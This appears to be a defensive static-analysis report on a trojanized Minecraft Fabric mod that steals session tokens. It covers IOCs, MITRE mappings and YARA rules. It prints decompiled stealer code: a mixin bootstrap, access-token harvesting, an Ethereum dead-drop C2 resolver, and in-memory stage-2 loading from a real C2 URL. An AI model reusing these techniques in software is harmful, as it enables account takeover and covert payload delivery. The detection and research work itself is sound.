# Technical Analysis — `SkyblockAddons-26.2.jar`
### Trojanized Fabric mod: Mixin bootstrap → Minecraft session stealer → Ethereum dead-drop C2 (EtherHiding) → in-memory stage-2 loader

**TLP: CLEAR** · Analysis date: 2026-10-13 · Static analysis only (sample not executed)

---

## 0. TL;DR

`SkyblockAddons-26.2.jar` is **not** the SkyBlockAddons mod. It is a repackaged build of the
legitimate Fabric mod **Toggle Sprint Display** (author `Aeltumn`, id `toggle-sprint-display`)
with a malicious mixin injected. On game startup the mixin reflectively loads a credential
stealer that:

1. Reads the player's **Minecraft username, UUID and `accessToken`** from
   `Minecraft.getInstance().getUser()`.
2. Resolves its C2 domain by calling **`text()` on an Ethereum smart contract**
   (`eth_call`, selector `0x1f1bd692`) across 31 public RPC endpoints — an *EtherHiding*
   dead-drop so the C2 can be rotated on-chain without touching the JAR.
3. Downloads an encrypted/in-memory **stage-2 JAR** from
   `https://systemnotifier.st/api/static/loading`, resolves the host via **DNS-over-HTTPS**
   (Cloudflare `1.1.1.1` / Google `8.8.8.8`) and connects by IP with SNI to evade
   hosts/DNS blocking.
4. Loads `com.example.Main` from the stage-2 JAR **entirely in memory** via a custom
   `ClassLoader` + in-memory `URLStreamHandler`, then calls `initialize(<json creds>)`.

A large decoy subsystem (custom "VM", "Guard", `vault.bin`, `integrity.bin`, anti-tamper
filler classes) is present but **never invoked**, and is functionally broken (`vm.bin` is
absent) — it exists to waste analyst time and to look like a pro-grade protector.

The family and TTPs match the publicly documented **Weedhack / Majanito** Minecraft
infostealer ecosystem and the **EtherHiding** technique class.

---

## 1. Sample metadata

| Field | Value |
|---|---|
| File name | `SkyblockAddons-26.2.jar` |
| Size | `1,592,758` bytes |
| SHA-256 | `85ccb86cf78c138c55eda930a3d577f7d5891f65f51dfa785acc3d1a1f7b5efa` |
| SHA-1 | `d3fa13c4326cc2a618ec1112a2cfaef675210f17` |
| MD5 | `b3353010af83c489a246c3f7b0ad30c0` |
| Type | ZIP / JAR (Fabric mod) — 63 entries (43 deflate, 20 stored) |
| Build timestamp (class/entry mtimes) | `2026-10-08 23:17` |
| Claimed identity | `Toggle Sprint Display` `2.0.2`, id `toggle-sprint-display`, author `Aeltumn`, license `LGPL-3.0` |
| Distribution lure | Filename impersonates the unrelated popular "SkyBlockAddons" mod |
| C2 | `systemnotifier.st` (resolved on-chain) |
| Stage-2 URL | `https://systemnotifier.st/api/static/loading` |
| Smart-contract C2 | `0x9044f5762e43b23ba91d124b51a045f1b51da652` (Ethereum mainnet) |

### 1.1 The legitimate mod it is built on

`fabric.mod.json` still advertises the real mod:

```json
{
  "schemaVersion": 1,
  "id": "toggle-sprint-display",
  "version": "2.0.2",
  "name": "Toggle Sprint Display",
  "authors": ["Aeltumn"],
  "license": "LGPL-3.0",
  "environment": "client",
  "entrypoints": { "modmenu": [ "com.aeltumn.togglesprintdisplay.integration.ModMenuIntegration" ] },
  "mixins": [ "toggle-sprint-display.mixins.json", "ece3700569f8.mixins.json" ],
  "depends": { "fabricloader": ">=0.19.0", "minecraft": ">=26.2" }
}
```

Two red flags:
* The filename `SkyblockAddons-26.2.jar` has nothing to do with the mod's real name.
* The `mixins` array contains a **second, unsigned-looking** mixin config
  `ece3700569f8.mixins.json` in a random package, not faced with the legit
  `toggle-sprint-display.mixins.json`.

---

## 2. Execution chain (end to end)

```
Fabric Loader (client env)
  └─ loads mixin config  ece3700569f8.mixins.json
        package: mece3700569f8, client: ["Mece3700569f8"]
  └─ Mece3700569f8  @Mixin(net.minecraft.client.Minecraft)
        @Inject(method="run", at=@At("HEAD"))  → onece3700569f8(CallbackInfo)
            Class.forName("q56p0dnpq.qw1mnsk.dq5m8eecjo.cxo7lzvo.jI0")
            .getDeclaredConstructor().newInstance()
            .getMethod("onInitialize").invoke(instance)
  └─ jI0.onInitialize()
        ├─ read Minecraft.getInstance().getUser() → {username, uuid, accessToken}
        ├─ this.o0i11 = i0c()  →  ljl._O_017( jol__13() )        # EtherHiding C2 resolver
        └─ new Thread(...):
              loIjOd()  →  "https://" + c2 + "/api/static/loading"  →  j1$.Ol3(url,true)
              open stage-2 JAR in memory, build ClassLoader(map classes, map resources)
              loadClass("com.example.Main").getDeclaredConstructor().newInstance()
              getMethod("initialize", String.class).invoke(obj, new Gson().toJson(creds))
```

### 2.1 Bootstrap — the fraudulent Mixin

`ece3700569f8.mixins.json`:

```json
{
  "required": true,
  "package": "mece3700569f8",
  "compatibilityLevel": "JAVA_21",
  "client": ["Mece3700569f8"],
  "injectors": { "defaultRequire": 1 }
}
```

Decompiled behaviour (bytecode verified):

```java
@Mixin(net.minecraft.client.Minecraft.class)
public abstract class Mece3700569f8 {
    private static volatile boolean xece3700569f8;

    @Inject(method = "run", at = @At("HEAD"))
    private void onece3700569f8(CallbackInfo ci) {
        if (xece3700569f8) return;      // run once
        xece3700569f8 = true;
        try {
            Class<?> c = Class.forName("q56p0dnpq.qw1mnsk.dq5m8eecjo.cxo7lzvo.jI0");
            Object o = c.getDeclaredConstructor().newInstance();
            c.getMethod("onInitialize").invoke(o);
        } catch (Throwable ignored) {}
    }
}
```

`javap` confirms the annotation: `Lorg/spongepowered/asm/mixin/injection/Inject; method=run at=Lorg/spongepowered/asm/mixin/injection/At; value=HEAD` and
`Lorg/spongepowered/asm/mixin/Mixin;` target `Lnet/minecraft/client/Minecraft;`.

Notably the class register is **not declared as a Fabric entrypoint** — it relies purely on
the Mixin subsystem to be loaded and executed at the head of the game loop.

---

## 3. Credential theft (`jI0`)

`jI0 implements ModInitializer` (used only as a convenient reflective entry object):

```java
public void onInitialize() {
    try {
        User user = Minecraft.getInstance().getUser();
        this.i112.addProperty(I114(),     user.getName());                       // "username"
        this.i112.addProperty(l_j$15(),   user.getProfileId().toString());       // "uuid"
        this.i112.addProperty(i_116(),    user.getAccessToken());                // "accessToken"
        this.i112.addProperty(Oji17(),    this.o0i11);                           // "C2"
        this.i112.addProperty(iloOi18(),  _loo19());                             // "jarFileName"
    } catch (Exception ignored) {}

    new Thread(() -> { /* stage-2 download + reflective load, see §5 */ }).start();
}
```

The five field-name getters (`I114`, `l_j$15`, `i_116`, `Oji17`, `iloOi18`, `_loo19`) are
synthetic string-deobfuscation methods. Decoded values: `username`, `uuid`, `accessToken`,
`C2`, and `jarFileName` = `SkyblockAddons-26.2` (the current JAR name). The stolen JSON
object is serialized with Gson and handed to stage 2.

**Impact:** a Minecraft `accessToken` is a live Microsoft/Xbox live session bearer token. It
grants account takeover (session hijack) without a password and is a first-class monetized
good in this malware ecosystem.

---

## 4. C2 resolution — Ethereum dead-drop ("EtherHiding")

### 4.1 Entry

```java
private String i0c() {
    return this.oO0010._O_017(jol__13());
}
```

`jol__13()` is a synthetic getter returning the hard-coded **contract address**
(deobfuscated at runtime, never stored in plaintext): 

```
0x9044f5762e43b23ba91d124b51a045f1b51da652
```

### 4.2 The resolver (`ljl`)

`ljl` holds 31 public Ethereum JSON-RPC endpoints (each produced by its own getter) and the
plaintext selector `0x1f1bd692` (byte-verified constant `o_$Oi1b`):

```java
private static final String[] j$$1a = { jll_I22(), lIOj23(), $o_24(), ... }; // 31 RPC URLs
private static final String o_$Oi1b = "0x1f1bd692";

public String _O_017(String contract) {
    for (String rpc : j$$1a) {
        try {
            String r = O1l18(rpc, contract);
            if (r != null && r.length() > 3) return r;
        } catch (Exception ignored) {}
    }
    return null;
}
```

`0x1f1bd692` is `keccak256("text()")[:4]` — the selector for calling a Solidity
`text()` view function. `O1l18` POSTs an `eth_call` (via `j1$.il_0O4`) to the RPC, then
`O_119` ABI-decodes the returned string:

```java
private String O_119(String hex) {
    if (hex == null || hex.length() < 130) return "";
    String s = hex.startsWith("0x") ? hex.substring(2) : hex;
    int len = Integer.parseInt(s.substring(64, 128), 16);            // ABI word[1] = length
    String body = s.substring(128, Math.min(128 + len*2, s.length()));// ABI word[2..] = data
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < body.length()-1; i += 2) {
        int ch = Integer.parseInt(body.substring(i, i+2), 16);
        if (ch != 0) sb.append((char) ch);
    }
    return sb.toString();
}
```

That is a textbook Ethereum ABI dynamic-string decode: `[offset=0x20][length][data...]`,
skipping the 32-byte offset word (64 hex chars) and reading the 32-byte length word.

### 4.3 Live resolution (reproduction)

The contract returns its C2 as UTF-8 text. Reproduce with a public RPC (no API key):

```bash
curl -s -X POST https://ethereum-rpc.publicnode.com \
  -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[
    {"to":"0x9044f5762e43b23ba91d124b51a045f1b51da652",
     "data":"0x1f1bd692"},"latest"]}'
```

Result (decoded):

```
systemnotifier.st
```

On-chain facts: the contract is deployed on **Ethereum mainnet**, is unverified, and was
created by `0x34d7fb0cdD43F39DdbDbe85cD6e0688B7596e665` in
`0xda4cf534054d992967430e9da3352b2adcfe9f2a7f58085f5c05b211671e16e0`. The operator can
repoint the C2 by calling `setText(...)`/`text()` and committing a new transaction — no
JAR update required. This is the defining property of EtherHiding: **immutable, takedown-
resistant, free-to-rotate infrastructure hosted on a public blockchain.**

---

## 5. Stage-2 download and in-memory loading (`jI0`, `lo`, `o`)

### 5.1 URL construction

```java
private byte[] loIjOd() {
    if (this.o0i11 == null || this.o0i11.isEmpty()) return null;
    char[] suffix = {'/','a','p','i','/','s','t','a','t','i','c','/','l','o','a','d','i','n','g'};
    char[] url = new char[8 + c2.length() + suffix.length];
    copy("https://", ...); copy(c2, ...); copy(suffix, ...);
    return j1$.Ol3(new String(url), true);   // true = resolve host via DoH
}
```

→ `https://systemnotifier.st/api/static/loading`

### 5.2 In-memory JAR → ClassLoader

`onInitialize`'s worker thread:

1. `JarInputStream` over the downloaded bytes; entries ending `.class` go into
   `map<binaryName, bytes>`, everything else into `map2<name, bytes>`.
2. An anonymous `ClassLoader` overrides:
   * `findClass` → `defineClass` from `map` (loads classes from memory, **no file on disk**);
   * `getResourceAsStream` / `getResource` → serve from `map2`, and for URLs installs the
     custom in-memory `URLStreamHandler` `lo` / `URLConnection` `o`.
3. `loadClass("com.example.Main")`, instantiate, then invoke
   `initialize(String)` with the JSON credential blob on yet another thread.

`o.getInputStream()` simply returns a `ByteArrayInputStream` over the resource bytes:

```java
@Override public InputStream getInputStream() { return new ByteArrayInputStream(this.lIl1l8); }
```

This is **fileless / reflective code loading** (T1620): the second stage never touches disk
and leaves almost no forensic artifact beyond the running JVM.

---

## 6. Network client with DNS-over-HTTPS (`j1$`)

`j1$` is a hand-rolled HTTPS client used for both the DoH requests and C2/stage-2 traffic.

* Hard-coded DoH resolvers: `1.1.1.1`, `8.8.8.8` (getters `$lj0010`, `Oi00O11`).
* `I_o0(host)` issues `GET /dns-query?name=<host>&type=A` (plaintext constants) and parses
  A records out of the JSON (`"data"` fields, filtering type==1 and IPv4 regex).
* Connections are made with a raw `SSLSocket`, SNI set to the **real hostname**
  (`SSLParameters.setServerNames(List.of(new SNIHostName(host)))`) while the socket is
  opened against the **DoH-resolved IP**.
* `Ol3`/`il_0O4` build minimal `GET`/`POST` HTTP/1.1 requests; `O__5`/`jlI_$6` strip HTTP
  headers and return the body.

Why it matters: resolving via DoH and connecting to a literal IP with SNI defeats local
`hosts`-file blocks, DNS sinkholes and many DNS-based network controls, while still
presenting the correct TLS SNI so the C2's certificate/SNI-routing works.

---

## 7. The decoy "protector" layer (`y0whhmrf.t52qmy3n.jyvfg75jyq.edmst`)

A sizeable, deliberately plausible anti-analysis layer that **is never referenced by the
loader**:

| Artifact | Apparent purpose | Reality |
|---|---|---|
| `VM.class`, `VM$MemberRef.class` | Custom bytecode interpreter | Looks for `vm.bin` via `getResourceAsStream`; **file is absent** → cannot run |
| `Guard.class` | Integrity / anti-tamper guard | Verifies `integrity.bin`; never called by `jI0` |
| `integrity.bin` | Manifest of class hashes | 21 entries, **all SHA-256 MATCH** — internally consistent but unused |
| `vault.bin` | "Encrypted payload vault" | `1,500,000` bytes, entropy `7.9999` → uniform random padding |
| `d/*.class` (Builder, Cache, Processor, Renderer, Util, ak736, aq9311, …) | Crypto/`license.dat`/`signature.sig` flavors | Junk filler classes; benign-sounding names, no callers |

Assessment: the layer functions as **defensive misdirection** (T1027) — it mimics a
commercial Java obfuscator/protector ("VM", "vault", "guard") to imply the sample is a
hardened, non-trivial target, but the actual malicious logic lives entirely in the small
`q56p0dnpq…` package and doesn't depend on any of it. Even the decoy is unfinished
(`vm.bin` missing).

---

## 8. Obfuscation / string encoding

* All sensitive strings (RPC URLs, contract address, field names, DoH strings, helper
  endpoints) are produced by synthetic `private static String xxx()` methods that assemble
  `new byte[]{...}` at runtime through chained integer arithmetic
  (`(x * 1847413600) - 163720859`, `(x * 530238862) - 20236511`, then `^ (…) >>> 5` and XOR
  with a per-byte constant). Nothing sensitive is a plaintext constant-pool string.
* Junk/dead code blocks with always-false branches (`if ((a ^ b) != c)`) and float/long
  no-ops are sprinkled through every method to slow decompilation.
* Plaintext strings that *do* remain (used by the YARA rule below): `0x1f1bd692`,
  `/dns-query?name=`, `&type=A`, `getAccessToken`, `getProfileId`, `accessToken`,
  `onInitialize`, the two random package paths.

A small deobfuscator that reproduces the getter arithmetic is included with this analysis
(`scripts/deob.py`).

---

## 9. MITRE ATT&CK mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Resource Development | Acquire Infrastructure: Server | T1583.003 | C2 VPS hosting `systemnotifier.st` |
| Resource Development | Stage Capabilities: Upload Malware | T1608.001 | Stage-2 JAR hosted at `/api/static/loading` |
| Resource Development | Acquire Infrastructure: Web Services / Domains | T1583.001/.006 | C2 domain + RPC relay usage |
| Initial Access / Execution | User Execution: Malicious File | T1204.002 | User installs the mod JAR |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 | File named `SkyblockAddons-*`, real pkgs `com.aeltumn.*` |
| Defense Evasion | Obfuscated Files or Information | T1027 | String getters + junk code |
| Defense Evasion | Obfuscated Files or Information: Embedded Payloads | T1027.009 | Decoy VM/vault subsystem |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 | Runtime string decode & ABI decode |
| Defense Evasion | Reflective Code Loading | T1620 | In-memory `ClassLoader` + `URLStreamHandler` |
| Discovery | System Owner/User Discovery | T1033 | Reads Minecraft user profile |
| Credential Access | Steal Application Access Token | T1528 | `user.getAccessToken()` |
| Credential Access | Unsecured Credentials | T1552 | Token read from live game session |
| Collection | Data from Local System | T1005 | Username/UUID/token/JAR name |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTPS stage-2/C2 |
| Command and Control | Application Layer Protocol: DNS | T1071.004 | DNS-over-HTTPS resolution |
| Command and Control | Encrypted Channel | T1573 | TLS via `SSLSocket` + SNI |
| Command and Control | Web Service: Dead Drop Resolver | T1102.001 | Ethereum contract `text()` (EtherHiding) |
| Command and Control | Dynamic Resolution | T1568 | On-chain C2 rotation |
| Command and Control | Proxy / Domain Fronting-adjacent evasion | T1090 | DoH → IP + SNI to bypass DNS blocks |
| Ingress/Exfil | Ingress Tool Transfer | T1105 | Downloads stage-2 JAR |
| Impact | Financial Theft | T1657 | Likely downstream token/wallet abuse (stage-2) |

---

## 10. Indicators of Compromise (IOCs)

### Network
```
systemnotifier[.]st
https://systemnotifier.st/api/static/loading
/dns-query?name=<host>&type=A        (DoH client behaviour)
DoH resolvers: 1.1.1.1, 8.8.8.8
```

### Blockchain
```
Contract (C2 dead-drop): 0x9044f5762e43b23ba91d124b51a045f1b51da652   (Ethereum mainnet)
Selector:                0x1f1bd692   = keccak256("text()")[:4]
Creator:                 0x34d7fb0cdD43F39DdbDbe85cD6e0688B7596e665
Creation tx:             0xda4cf534054d992967430e9da3352b2adcfe9f2a7f58085f5c05b211671e16e0
```

### Host / filesystem
```
SkyblockAddons-26.2.jar  (sha256 85ccb86cf78c138c55eda930a3d577f7d5891f65f51dfa785acc3d1a1f7b5efa)
Classes: q56p0dnpq/qw1mnsk/dq5m8eecjo/cxo7lzvo/{jI0,ljl,j1$,lo,o,C$}.class
Mixin:   mece3700569f8/Mece3700569f8.class + ece3700569f8.mixins.json
Decoy:   y0whhmrf/t52qmy3n/jyvfg75jyq/edmst/{VM,Guard}.class, vault.bin, integrity.bin
Strings: 0x1f1bd692 ; /dns-query?name= ; getAccessToken ; com.example.Main ; initialize
```

### Behavioral
* Fabric client mod whose `mixins.json` references a second, randomly-named package.
* JVM opens outbound TLS to a literal IP with SNI ≠ host and issues `/dns-query` requests.
* An `eth_call` with `data = 0x1f1bd692` leaving the host.
* `com.example.Main.initialize(String)` invoked with a JSON blob containing
  `username`/`uuid`/`accessToken`.

---

## 11. Detection — YARA rule

```yara
rule Minecraft_Fabric_EtherHiding_Stealer_Loader
{
    meta:
        description   = "Trojanized Fabric mod: Mixin bootstrap -> Minecraft token stealer -> Ethereum (EtherHiding) dead-drop C2 -> in-memory stage-2 JAR over DoH"
        author        = "opencode static analysis"
        date          = "2026-10-13"
        sample_sha256 = "85ccb86cf78c138c55eda930a3d577f7d5891f65f51dfa785acc3d1a1f7b5efa"

    strings:
        $eth_selector = "0x1f1bd692" ascii
        $doh_path     = "/dns-query?name=" ascii
        $doh_type     = "&type=A" ascii
        $mixin_json   = "ece3700569f8.mixins.json" ascii
        $mixin_class  = "Mece3700569f8" ascii
        $pkg_loader   = "q56p0dnpq/qw1mnsk/dq5m8eecjo/cxo7lzvo" ascii
        $pkg_decoy    = "y0whhmrf/t52qmy3n/jyvfg75jyq/edmst" ascii
        $cred_token   = "getAccessToken" ascii
        $cred_profile = "getProfileId" ascii
        $cred_name    = "getUser" ascii
        $fabric_init  = "net/fabricmc/api/ModInitializer" ascii
        $launch       = "onInitialize" ascii
        $decoy_vault  = "vault.bin" ascii
        $decoy_integr = "integrity.bin" ascii

    condition:
        ($eth_selector and $doh_path and $doh_type)
        or ($pkg_loader and $pkg_decoy)
        or ($mixin_json and $mixin_class and ($cred_token or $cred_profile))
        or ($pkg_loader and $cred_token and $cred_profile and $cred_name and $launch)
        or ($fabric_init and $cred_token and $cred_profile and $decoy_vault and $decoy_integr)
}

rule Minecraft_Fabric_Mixin_Class_Bootstrap
{
    meta:
        description = "Fabric Mixin that reflectively launches a random-named loader from Minecraft.run (HEAD)"
        author      = "opencode static analysis"
        date        = "2026-10-13"

    strings:
        $pkg       = "mece3700569f8" ascii
        $minecraft = "net/minecraft/client/Minecraft" ascii
        $init      = "onInitialize" ascii
        $forname   = "java/lang/Class" ascii
        $reflect   = "java/lang/reflect/Method" ascii
        $inject    = "org/spongepowered/asm/mixin/injection/Inject" ascii

    condition:
        uint32be(0) == 0xCAFEBABE and all of them
}
```

**Validation performed** (this analysis, `yara` 4.5.8 and `yr` / YARA-X 1.21.0):

```
$ yara -r minecraft_etherhiding.yar skyblock-extract/
Minecraft_Fabric_EtherHiding_Stealer_Loader  .../q56p0dnpq/.../jI0.class
Minecraft_Fabric_EtherHiding_Stealer_Loader  .../edmst/integrity.bin
Minecraft_Fabric_Mixin_Class_Bootstrap       .../mece3700569f8/Mece3700569f8.class

$ yara minecraft_etherhiding.yar SkyblockAddons-26.2.jar
Minecraft_Fabric_EtherHiding_Stealer_Loader  SkyblockAddons-26.2.jar   # via stored integrity.bin + mixin json
```

> Note: JAR payloads are often deflate-compressed; scan **extracted files** for full
> coverage. The `integrity.bin` manifest is stored uncompressed and leaks both random
> package paths, so the rule still fires on the raw `.jar` as a convenience.

---

## 12. Reproduction steps (analyst workflow)

```bash
# 1. Fingerprint
sha256sum SkyblockAddons-26.2.jar          # 85ccb86c…7b5efa
unzip -l SkyblockAddons-26.2.jar | wc -l   # 63 entries; note 2nd random mixins.json

# 2. Look at the manifest and the injected mixin
unzip -p SkyblockAddons-26.2.jar fabric.mod.json
unzip -p SkyblockAddons-26.2.jar ece3700569f8.mixins.json

# 3. Extract and decompile
mkdir -p skyblock-extract && unzip -o SkyblockAddons-26.2.jar -d skyblock-extract
jadx -d jadx-out SkyblockAddons-26.2.jar

# 4. Trace the entrypoint
grep -r "onInitialize\|Class.forName" jadx-out/sources/mece3700569f8/
#   -> jI0.onInitialize : Minecraft.getInstance().getUser().getAccessToken()

# 5. Recover on-chain C2 (no API key needed)
curl -s -X POST https://ethereum-rpc.publicnode.com -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[
    {"to":"0x9044f5762e43b23ba91d124b51a045f1b51da652","data":"0x1f1bd692"},"latest"]}'
#   -> 0x… (ABI string) -> "systemnotifier.st"

# 6. Confirm the download URL is built as https://<c2>/api/static/loading  (jI0.loIjOd)

# 7. Detonate the rule
yara -r minecraft_etherhiding.yar skyblock-extract/
```

Helpers written during this analysis (see `scripts/`):
* `scripts/deob.py` — reproduces the LCG/XOR string-getter encoding.
* `scripts/integrity.py` — parses/verifies `integrity.bin` (21/21 SHA-256 MATCH).

---

## 13. Assessment & scope notes

* **Confidence the sample is malicious: high.** The injection is unambiguous, the token
  theft is explicit, the EtherHiding resolver is fully present with a live on-chain C2, and
  a second-stage downloader is implemented. There is no legitimate reason for a HUD mod to
  call `getAccessToken()` or `eth_call`.
* **Stage-2 not retrieved** (static-only analysis; sample not executed). The exact payload
  (`com.example.Main`) is unknown, but the family context (Weedhack / Majanito) and the
  credential blob strongly indicate session/token theft and, commonly, crypto-wallet and
  session-cookie theft in the premium stages.
* **No keylogger/webcam/RAT code observed in stage 1** — those are typically delivered or
  enabled by the second stage in this ecosystem, not in the initial dropper.

---

## 14. References

* 0xresetti — "Weedhack" MaaS analysis: `https://0xresetti.github.io/weedhack.html`
* Thereallo — "EtherHiding / malicious Minecraft mods abusing Ethereum contracts"
  (in-memory stage-2 via DoH + Solidity dead-drop).
* MITRE ATT&CK — T1102.001 (Dead Drop Resolver), T1620 (Reflective Code Loading),
  T1528 (Steal Application Access Token).

*Prepared as an educational/defensive writeup. TLP:CLEAR.*
